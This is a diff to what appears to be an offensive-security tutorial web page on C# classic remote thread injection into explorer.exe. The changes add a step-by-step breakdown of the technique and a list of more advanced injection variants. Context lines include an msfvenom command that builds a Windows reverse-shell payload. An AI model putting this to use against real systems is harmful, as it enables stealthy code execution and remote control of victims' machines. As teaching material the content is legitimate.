@@ -463,7 +463,7 @@
                     <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                     <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
                     <code class="break-all language-csharp text-green-300  ">
-// Project Name: Process Injection - Hardcoded shellcode
+// Project Name: Classic Remote Thread Injection  - Hardcoded shellcode
 // By: Iron Hulk
 
 using System;
@@ -582,7 +582,25 @@ class Encrypt
         }
         return decryptedBytes;
     }
-}                    
+}
+
+
+/*
+
+This code performs classic remote thread injection (using CreateRemoteThread()), 
+not thread hijacking, APC injection, or other advanced techniques. Let's break it down:
+
+    1 — Locate target: GetPid("explorer") which will find the PID of explorer.exe.
+    2 — Anti-UI: GetConsoleWindow → ShowWindow(SW_HIDE), it will hide its own console window for a cleaner launch.
+    3 — Decrypt payload: SHA256 → AES_Decrypt, it uses a hard-coded passphrase (“MyK3yG0o0zH3r3”) → SHA-256 → PBKDF2 (1000 iter) 
+        to derive AES-256-CBC key+IV and decrypt an embedded byte array (Enc).
+    4 — Open remote handle: OpenProcess(PROCESS_VM_WRITE ∣ … ∣ PROCESS_CREATE_THREAD), gains full VM + thread-creation rights on the remote process.
+    5 — Allocate memory: VirtualAllocEx(..., MEM_COMMIT, PAGE_READWRITE), it will reserves RW pages in explorer.exe.
+    6 — Copy shellcode: WriteProcessMemory, drops the decrypted shellcode into that region.
+    7 — Make it executable: VirtualProtectEx(..., PAGE_EXECUTE_READ), it will flip protection so the CPU is allowed to execute it.
+    8 — Launch payload: CreateRemoteThread(..., lpStartAddress = spaceAddr) and spawns a new thread whose entry point is the shellcode you just wrote.
+
+*/                  
                     </code>
                     </pre>
                 </div>
@@ -596,7 +614,7 @@ class Encrypt
                     </svg>
                     
                 </summary>
-                <p class="mb-4 text-sm text-slate-400">Don't for get to start http server if its on your local host..</p>
+                <p class="mb-4 text-sm text-slate-400">Don't for get to start http server if its on your local host.</p>
                 <br>
                 <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
                     <summary class="flex items-center justify-between text-xl font-semibold text-red-300 cursor-pointer ">
@@ -609,7 +627,7 @@ class Encrypt
                         <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                         <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
                             <code class="break-all language-csharp text-green-300  ">
-// Project Name: Process Injection - Encryption
+// Project Name: Classic Remote Thread Injection - Encryption
 // msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f raw -o injection.bin
 // This will create a new file: injection.enc
 // By: Iron Hulk
@@ -709,7 +727,7 @@ public static class Encryptor
                         <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                         <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
                         <code class="break-all language-csharp text-green-300  ">
-// Project Name: Process Injection - Download -> Decryption -> Inject -> Run
+// Project Name: Classic Remote Thread Injection - Download -> Decryption -> Inject -> Run
 // By: Iron Hulk
 
 using System;
@@ -874,6 +892,17 @@ class Decryption
                 </details>
             </details>
         </div>
+        <br>
+        <article>
+            <h3 class="mb-2 text-lg font-semibold text-teal-300">Upgrade the attack to do:</h3>
+            <ul class="list-disc pl-6 space-y-1 text-sm leading-relaxed">
+                <li>Hijack an existing thread.</li>
+                <li>Hook Injection.</li>
+                <li>Process Hollowing.</li>
+                <li>Queue an APC injection.</li>
+                <li>Overwrite a callback entry point.</li>
+            </ul>
+        </article>
     </div>
     <style>
         .copy-button 
